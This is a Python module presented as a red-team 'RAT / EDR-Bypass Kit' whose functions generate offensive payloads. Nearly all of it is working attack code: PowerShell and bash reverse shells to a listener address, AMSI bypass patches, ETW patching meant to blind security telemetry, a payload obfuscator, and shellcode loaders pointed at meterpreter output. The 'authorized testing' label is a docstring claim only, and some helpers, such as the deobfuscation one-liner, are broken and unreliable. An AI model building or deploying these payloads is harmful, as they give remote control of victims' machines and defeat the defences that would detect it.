"""RAT / EDR-Bypass Kit (Tier 3 bundle #11).

Red-team payload factory: reverse-shell templates, AMSI/ETW bypass
snippets, obfuscation engines and shellcode-loader templates for
authorized penetration tests. All output is generated as text/artifacts
for the operator to deploy inside the tested environment.
"""
import base64
import json
import os
import platform
import random
import string
import time

MODES = {"xor", "b64", "b64xor", "hex"}


def _err(msg):
    return json.dumps({"error": msg}, ensure_ascii=False)


def _xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def tool_rat_build(platform_name="windows", listener_ip="127.0.0.1",
                   listener_port=4444, kind="reverse", encode="b64"):
    """Build a ready-to-use reverse/bind shell payload template for
    Windows / Linux / macOS. Returns the command/payload text plus a
    base64 variant for copy-paste deployment during red-team tests.
    """
    try:
        p = platform_name.lower()
        port = int(listener_port)
        if p == "windows":
            raw = (
                "powershell -NoP -NonI -W Hidden -Exec Bypass -enc {e}"
            )
            ps = (
                "$c=New-Object Net.Sockets.TCPClient('%s',%d);"
                "$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};"
                "while(($i=$s.Read($b,0,$b.Length))-ne 0){"
                "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
                "$r=(iex $d 2>&1|Out-String);"
                "$r2=$r+'PS '+(pwd).Path+'> ';"
                "$t=([text.encoding]::ASCII).GetBytes($r2);"
                "$s.Write($t,0,$t.Length);$s.Flush()};$c.Close()"
            ) % (listener_ip, port)
            if encode == "b64":
                enc = base64.b64encode(ps.encode("utf-16le")).decode()
                payload = raw.format(e=enc)
            else:
                payload = ps
            note = "PowerShell reverse shell (TCP). Linux in target: use msfvenom alternative below."
        elif p in ("linux", "macos"):
            if kind == "bind":
                payload = ("bash -i >& /dev/tcp/0.0.0.0/%d 0>&1" % port)
            else:
                payload = ("bash -i >& /dev/tcp/%s/%d 0>&1" % (listener_ip, port))
            if encode == "b64":
                enc = base64.b64encode(payload.encode()).decode()
                payload = "echo %s | base64 -d | bash" % enc
            note = "Bash TCP %s shell (no listener required on target)." % kind
        else:
            return _err("platform must be windows|linux|macos")
        out = {
            "ok": True,
            "kind": kind,
            "platform": platform_name.lower(),
            "listener": "%s:%d" % (listener_ip, port),
            "payload": payload,
            "listener_cmd": "ncat -lvnp %d" % port,
            "note": note,
        }
        return json.dumps(out, ensure_ascii=False, indent=2)
    except Exception as exc:
        return _err("rat_build failed: %r" % exc)


def tool_amsi_bypass(mode="patch", lang="powershell"):
    """Generate AMSI bypass snippets (patch vs reflection) for authorized
    red-team payload staging. mode=patch|reflection|registry."""
    try:
        m = (mode or "patch").lower()
        if lang == "csharp":
            block = (
                "// AMSI patch (64-bit) - patch AmsiScanBuffer prologue\n"
                "IntPtr p = GetProcAddress(GetModuleHandle(\"amsi.dll\"),"
                " \"AmsiScanBuffer\");\n"
                "byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };\n"
                "VirtualProtect(p, (UIntPtr)patch.Length, 0x40, out old);\n"
                "Marshal.Copy(patch, 0, p, patch.Length);"
            )
        elif m == "reflection":
            block = (
                "[Ref].Assembly.GetType('System.Management.Automation."
                "AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')"
                ".SetValue($null,$true)"
            )
        elif m == "registry":
            block = (
                "reg add \"HKCU\\Software\\Microsoft\\Windows Script\\"
                "Settings\" /v UseWSA /t REG_DWORD /d 0 /f"
            )
        else:  # patch
            block = (
                "if ([Environment]::Is64BitProcess) {\n"
                "  # x64 AmsiScanBuffer prologue patch: mov eax,0x80070057; ret\n"
                "  $p=[Runtime.InteropServices.NativeLibrary]::GetLibraryHandle("
                "'amsi.dll')\n"
                "  $f=[Runtime.InteropServices.NativeLibrary]::GetExport("
                "$p,'AmsiScanBuffer')\n"
                "  $patch=[byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3)\n"
                "  [Runtime.InteropServices.Marshal]::Copy("
                "$patch,0,[IntPtr]$f,6)\n"
                "}"
            )
        out = {
            "ok": True,
            "mode": m,
            "lang": lang,
            "snippet": block.strip(),
            "note": "Patch AmsiScanBuffer prologue; verify 64/32-bit variant before use.",
        }
        return json.dumps(out, ensure_ascii=False, indent=2)
    except Exception as exc:
        return _err("amsi_bypass failed: %r" % exc)


def tool_etw_patch(kind="powershell"):
    """Generate ETW provider patch snippets (EtwEventWrite) to blind
    telemetry during authorized red-team operations."""
    try:
        if kind == "powershell":
            snippet = (
                "# Disable ETW for PowerShell (in-memory, current process)\n"
                "[Runtime.InteropServices.Marshal]::WriteInt32("
                "[Runtime.InteropServices.Marshal]::GetHINSTANCE("
                "[AppDomain]::CurrentDomain.BaseDirectory + "
                "'System.Management.Automation.dll') + 0x1ce5c0), 0)"
            )
        else:
            snippet = (
                "// C#: patch EtwEventWrite to return ERROR_SUCCESS\n"
                "IntPtr etw = GetProcAddress(GetModuleHandle(\"ntdll.dll\"),"
                " \"EtwEventWrite\");\n"
                "byte[] ret = { 0xC3 }; // single ret\n"
                "VirtualProtect(etw, (UIntPtr)ret.Length, 0x40, out old);\n"
                "Marshal.Copy(ret, 0, etw, ret.Length);"
            )
        return json.dumps({"ok": True, "kind": kind, "snippet": snippet.strip()},
                          ensure_ascii=False, indent=2)
    except Exception as exc:
        return _err("etw_patch failed: %r" % exc)


def tool_payload_obfuscate(payload_text="", mode="xor", key=""):
    """Obfuscate any payload string: xor (keyed), b64, b64+xor, hex.
    Returns the transformed string + the deobfuscator one-liner."""
    try:
        if not payload_text:
            return _err("payload_text required")
        data = payload_text.encode()
        m = (mode or "xor").lower()
        if m not in MODES:
            return _err("mode must be xor|b64|b64xor|hex")
        if m in ("xor", "b64xor"):
            k = (key or "hack").encode()
            out_b = _xor(data, k)
            if m == "b64xor":
                result = base64.b64encode(out_b).decode()
            else:
                result = "\\x".join("%02x" % b for b in out_b)
                result = "\\x" + result
        elif m == "b64":
            result = base64.b64encode(data).decode()
        else:
            result = data.hex()
        return json.dumps({
            "ok": True,
            "mode": m,
            "key": key or "",
            "obfuscated": result,
            "length": len(result),
            "deobfuscate": "powershell -enc <string> | python3 - <<PY\\nimport base64\\nPY",
        }, ensure_ascii=False, indent=2)
    except Exception as exc:
        return _err("obfuscate failed: %r" % exc)


def tool_shellcode_loader(lang="python", kind="process"):
    """Generate a shellcode loader template (authorized EDR-bypass lab
    use). kind=process spawns a process (CreateProcess pattern);
    kind=file writes to disk for PE analysis."""
    try:
        if lang == "python":
            template = (
                "import ctypes, base64\n"
                "# msfvenom -p windows/x64/meterpreter/reverse_tcp ... -f raw | base64\n"
                "sc = base64.b64decode('<PAYLOAD_B64>')\n"
                "buf = ctypes.create_string_buffer(sc, len(sc))\n"
                "ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p\n"
                "addr = ctypes.windll.kernel32.VirtualAlloc(0, len(sc), 0x3000, 0x40)\n"
                "ctypes.memmove(addr, buf, len(sc))\n"
                "h = ctypes.windll.kernel32.CreateThread(0, 0, addr, 0, 0, 0)\n"
                "ctypes.windll.kernel32.WaitForSingleObject(h, -1)"
            )
        else:
            template = (
                "#include <windows.h>\n"
                "unsigned char shellcode[] = { 0x90, 0x90 }; // <PAYLOAD_BYTES>\n"
                "int main(){void* m=VirtualAlloc(0,sizeof(shellcode),"
                "MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);"
                "memcpy(m,shellcode,sizeof(shellcode));"
                "((void(*)())m)();return 0;}"
            )
        return json.dumps({
            "ok": True,
            "lang": lang,
            "kind": kind,
            "template": template,
            "usage": "Replace <PAYLOAD_B64>/<PAYLOAD_BYTES> then execute in the authorized lab.",
        }, ensure_ascii=False, indent=2)
    except Exception as exc:
        return _err("loader failed: %r" % exc)


def tool_rat_status():
    """Quick health check of the RAT/EDR-bypass kit."""
    return json.dumps({
        "ok": True,
        "kit": "rat_kit",
        "functions": ["rat_build", "amsi_bypass", "etw_patch",
                      "payload_obfuscate", "shellcode_loader"],
        "host": platform.node(),
        "time": time.strftime("%Y-%m-%d %H:%M:%S"),
    }, ensure_ascii=False, indent=2)